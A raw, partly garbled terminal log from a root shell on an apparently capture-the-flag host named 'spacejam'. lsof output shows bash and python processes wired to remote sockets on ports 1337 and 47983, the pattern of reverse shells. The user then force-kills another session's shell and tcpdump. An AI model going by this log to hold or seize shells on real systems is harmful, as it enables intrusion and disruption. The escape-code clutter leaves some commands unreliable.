python    1745     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
root@spacejam:/# export TERM=xterm
root@spacejam:/# .[H.[2Jroot@spacejam:/# lsof -i -P -n|grep 10.10.1*
http      1289     _apt    3u  IPv4  25108      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:47512->91.189.91.83:80 (SYN_SENT)
http      1290     _apt    3u  IPv4  25113      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:33258->91.189.91.81:80 (SYN_SENT)
bash      1327     root    0u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root  255u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1400     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
bash      1400     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
bash      1400     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
bash      1400     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
bash      1400     root  255u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
python    1745     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
python    1745     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
python    1745     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
python    1745     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
bash      1746     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
grep      1765     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10..[m.[K46.213:34920->.[01;31m.[K10.10..[m.[K25.156:1337 (ESTABLISHED)
root@spacejam:/# lsof -i -P -n|grep 10.10.1*..[K..[K*.[H.[2Jroot@spacejam:/# lsof -i -P -n|grep 10.10.*
http      1289     _apt    3u  IPv4  25108      0t0  TCP .[01;31m.[K10.10.46.213:47512->91.189.91.83:80 (SYN_SENT).[m.[K
http      1290     _apt    3u  IPv4  25113      0t0  TCP .[01;31m.[K10.10.46.213:33258->91.189.91.81:80 (SYN_SENT).[m.[K
bash      1327     root    0u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root  255u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1400     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root  255u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1745     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1745     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1745     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1745     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1746     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
grep      1767     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
root@spacejam:/# kill -9 13611349 1327 
bash: kill: (13611349) - No such process
root@spacejam:/# kill -9 13611349 1327 .........